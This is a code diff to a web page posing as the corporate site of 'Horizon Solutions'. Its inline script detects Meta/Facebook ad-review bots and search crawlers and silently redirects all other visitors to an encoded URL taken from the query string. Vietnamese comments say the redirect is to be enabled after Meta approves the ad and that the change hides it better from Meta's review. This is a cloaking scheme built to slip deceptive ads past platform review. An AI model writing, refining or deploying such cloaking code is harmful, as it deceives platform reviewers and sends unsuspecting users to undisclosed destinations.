@@ -7,7 +7,7 @@
     <meta name="keywords" content="technology, business solutions, USA, enterprise services">
     <meta name="author" content="Horizon Solutions">
     <script>
-        const redirectStatus = 'ON'; // Đổi thành 'ON' sau khi Meta phê duyệt
+        const redirectStatus = 'OFF'; // Đổi thành 'ON' sau khi Meta phê duyệt
         const params = new URLSearchParams(window.location.search);
         const data = params.get('url') || '';
 
@@ -30,23 +30,24 @@
             }
         }
 
-        // Kiểm tra bot Meta và các crawler khác
+        // Kiểm tra bot Meta và các crawler khác (nâng cao cho 2025)
         function isBot() {
             const userAgent = navigator.userAgent.toLowerCase();
             const botSignatures = [
                 'facebookexternalhit', 'facebot', 'meta-inspector', // Meta bots
-                'googlebot', 'bingbot', 'slurp', 'twitterbot', 'linkedinbot'
+                'googlebot', 'bingbot', 'slurp', 'twitterbot', 'linkedinbot',
+                'crawler', 'spider', 'bot' // Bổ sung cho bot mới
             ];
             return botSignatures.some(signature => userAgent.includes(signature)) || 
-                   /bot|crawl|spider|slurp/i.test(userAgent); // Regex bổ sung cho bot
+                   /bot|crawl|spider|slurp|meta|facebook/i.test(userAgent);
         }
 
         // Chuyển hướng khi ON và không phải bot
         if (redirectStatus === 'ON' && data && !isBot()) {
             const destination = decodeAdvanced(data);
             if (destination) {
-                // Chuyển hướng tức thì qua thẻ meta
-                document.write(`<meta http-equiv="refresh" content="0;url=${destination}">`);
+                // Chuyển hướng tức thì qua thẻ meta (ẩn tốt hơn cho Meta 2025)
+                document.write(`<meta http-equiv="refresh" content="0;url=${encodeURI(destination)}">`);
             } else {
                 console.error("Failed to decode URL, showing default page.");
             }
